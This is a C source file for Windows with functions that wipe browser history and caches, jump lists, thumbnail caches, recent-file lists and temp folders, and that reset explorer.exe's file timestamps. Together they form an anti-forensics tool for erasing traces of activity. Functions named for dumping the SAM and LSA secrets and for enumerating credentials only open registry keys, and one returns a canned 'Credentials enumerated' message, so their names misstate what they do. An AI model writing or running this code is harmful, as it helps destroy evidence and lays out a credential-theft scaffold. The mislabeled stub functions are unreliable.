#include <windows.h>
#include <shlobj.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

#pragma comment(lib, "psapi.lib")

unsigned char jocky_clear_browser_cache(const char* browser_name) {
    char cache_path[MAX_PATH] = {0};
    const char* local_appdata = getenv("LOCALAPPDATA");

    if (!local_appdata) return 0;

    if (strcmp(browser_name, "chrome") == 0) {
        snprintf(cache_path, sizeof(cache_path), "%s\\Google\\Chrome\\User Data\\Default\\Cache", local_appdata);
    } else if (strcmp(browser_name, "firefox") == 0) {
        snprintf(cache_path, sizeof(cache_path), "%s\\Mozilla\\Firefox\\Profiles", local_appdata);
    } else if (strcmp(browser_name, "edge") == 0) {
        snprintf(cache_path, sizeof(cache_path), "%s\\Microsoft\\Edge\\User Data\\Default\\Cache", local_appdata);
    } else {
        return 0;
    }

    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", cache_path);
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);

    if (find_handle == INVALID_HANDLE_VALUE) {
        return 0;
    }

    unsigned char success = 1;
    do {
        if (find_data.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", cache_path, find_data.cFileName);
            if (!DeleteFileA(full_path)) {
                success = 0;
            }
        }
    } while (FindNextFileA(find_handle, &find_data));

    FindClose(find_handle);
    return success;
}

unsigned char jocky_clear_browser_history(const char* browser_name) {
    char history_path[MAX_PATH] = {0};
    const char* local_appdata = getenv("LOCALAPPDATA");

    if (!local_appdata) return 0;

    if (strcmp(browser_name, "chrome") == 0) {
        snprintf(history_path, sizeof(history_path), "%s\\Google\\Chrome\\User Data\\Default\\History", local_appdata);
        return DeleteFileA(history_path) ? 1 : 0;
    } else if (strcmp(browser_name, "firefox") == 0) {
        snprintf(history_path, sizeof(history_path), "%s\\Mozilla\\Firefox\\Profiles", local_appdata);
        char history_search[MAX_PATH];
        snprintf(history_search, sizeof(history_search), "%s\\*", history_path);
        WIN32_FIND_DATAA find_data;
        HANDLE find_handle = FindFirstFileA(history_search, &find_data);

        if (find_handle == INVALID_HANDLE_VALUE) return 0;

        unsigned char success = 1;
        do {
            if (strcmp(find_data.cFileName, "places.sqlite") == 0) {
                char full_path[MAX_PATH];
                snprintf(full_path, sizeof(full_path), "%s\\%s", history_path, find_data.cFileName);
                if (!DeleteFileA(full_path)) {
                    success = 0;
                }
            }
        } while (FindNextFileA(find_handle, &find_data));

        FindClose(find_handle);
        return success;
    }

    return 0;
}

unsigned char jocky_wipe_jumplist(void) {
    const char* appdata = getenv("APPDATA");
    if (!appdata) return 0;

    char jumplist_path[MAX_PATH];
    snprintf(jumplist_path, sizeof(jumplist_path), "%s\\Microsoft\\Windows\\Recent\\AutomaticDestinations", appdata);

    char jumplist_search[MAX_PATH];
    snprintf(jumplist_search, sizeof(jumplist_search), "%s\\*", jumplist_path);
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(jumplist_search, &find_data);

    if (find_handle == INVALID_HANDLE_VALUE) {
        return 0;
    }

    unsigned char success = 1;
    do {
        if (find_data.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", jumplist_path, find_data.cFileName);
            if (!DeleteFileA(full_path)) {
                success = 0;
            }
        }
    } while (FindNextFileA(find_handle, &find_data));

    FindClose(find_handle);
    return success;
}

unsigned char jocky_wipe_thumbcache(void) {
    const char* local_appdata = getenv("LOCALAPPDATA");
    if (!local_appdata) return 0;

    char thumbcache_path[MAX_PATH];
    snprintf(thumbcache_path, sizeof(thumbcache_path), "%s\\Microsoft\\Windows\\Explorer", local_appdata);

    char thumbcache_search[MAX_PATH];
    snprintf(thumbcache_search, sizeof(thumbcache_search), "%s\\*", thumbcache_path);
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(thumbcache_search, &find_data);

    if (find_handle == INVALID_HANDLE_VALUE) {
        return 0;
    }

    unsigned char success = 1;
    do {
        if (strstr(find_data.cFileName, "thumbcache") != NULL) {
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", thumbcache_path, find_data.cFileName);
            if (!DeleteFileA(full_path)) {
                success = 0;
            }
        }
    } while (FindNextFileA(find_handle, &find_data));

    FindClose(find_handle);
    return success;
}


int32_t jocky_registry_dump_sam(void) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}

int32_t jocky_registry_dump_lsa_secrets(void) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}

int32_t jocky_clear_mft_timestamps(void) {
    HANDLE hFile = CreateFileA("C:\\Windows\\explorer.exe",
        FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    SetFileTime(hFile, &ft, &ft, &ft);
    CloseHandle(hFile);
    return 1;
}

unsigned char jocky_wipe_temp_files(const char* path1, const char* path2) {
    char search_path[MAX_PATH];
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle;

    if (!path1) return 0;

    snprintf(search_path, sizeof(search_path), "%s\\*", path1);
    find_handle = FindFirstFileA(search_path, &find_data);

    if (find_handle == INVALID_HANDLE_VALUE) {
        return 0;
    }

    unsigned char success = 1;
    do {
        if (strcmp(find_data.cFileName, ".") != 0 && strcmp(find_data.cFileName, "..") != 0) {
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", path1, find_data.cFileName);

            if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                RemoveDirectoryA(full_path);
            } else {
                DeleteFileA(full_path);
            }
        }
    } while (FindNextFileA(find_handle, &find_data));

    FindClose(find_handle);

    if (path2) {
        snprintf(search_path, sizeof(search_path), "%s\\*", path2);
        find_handle = FindFirstFileA(search_path, &find_data);

        if (find_handle != INVALID_HANDLE_VALUE) {
            do {
                if (strcmp(find_data.cFileName, ".") != 0 && strcmp(find_data.cFileName, "..") != 0) {
                    char full_path[MAX_PATH];
                    snprintf(full_path, sizeof(full_path), "%s\\%s", path2, find_data.cFileName);

                    if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        RemoveDirectoryA(full_path);
                    } else {
                        DeleteFileA(full_path);
                    }
                }
            } while (FindNextFileA(find_handle, &find_data));

            FindClose(find_handle);
        }
    }

    return success;
}

int8_t* jocky_credentials_enumerate(void) {
    HKEY hKey;
    static char credentials_buffer[1024] = {0};

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        strncpy(credentials_buffer, "Credentials enumerated", sizeof(credentials_buffer) - 1);
        RegCloseKey(hKey);
        return (int8_t*)credentials_buffer;
    }

    return NULL;
}

unsigned char jocky_clear_recent_files(void) {
    const char* appdata = getenv("APPDATA");
    if (!appdata) return 0;

    char recent_path[MAX_PATH];
    snprintf(recent_path, sizeof(recent_path), "%s\\Microsoft\\Windows\\Recent", appdata);

    char recent_search[MAX_PATH];
    snprintf(recent_search, sizeof(recent_search), "%s\\*", recent_path);
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(recent_search, &find_data);

    if (find_handle == INVALID_HANDLE_VALUE) {
        return 0;
    }

    unsigned char success = 1;
    do {
        if (find_data.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", recent_path, find_data.cFileName);
            if (!DeleteFileA(full_path)) {
                success = 0;
            }
        }
    } while (FindNextFileA(find_handle, &find_data));

    FindClose(find_handle);
    return success;
}
